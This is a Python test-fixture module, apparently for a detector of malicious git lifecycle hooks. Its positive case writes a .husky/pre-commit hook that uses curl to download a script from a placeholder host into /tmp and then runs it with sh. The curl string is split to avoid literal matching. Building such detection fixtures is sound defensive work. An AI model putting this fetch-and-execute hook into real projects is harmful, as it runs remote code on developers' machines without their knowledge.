"""Split-line lifecycle hook fixtures (issue 42)."""

from __future__ import annotations

from . import Case, File, Fixture

HOOK = ".husky/pre-commit"
FETCH = "cu" + "rl -sL https://example.invalid/x -o /tmp/x"
EXECUTE = "sh /tmp/x"


def _hook(*lines: str) -> Case:
    return Case(files=(File(HOOK, text="\n".join(lines) + "\n"),))


def ci_lifecycle_hook_window() -> Fixture:
    return Fixture(
        positive=_hook(FETCH, EXECUTE),
        negative=_hook("pre-commit run --all-files"),
    )


BUILDERS: dict[str, object] = {}
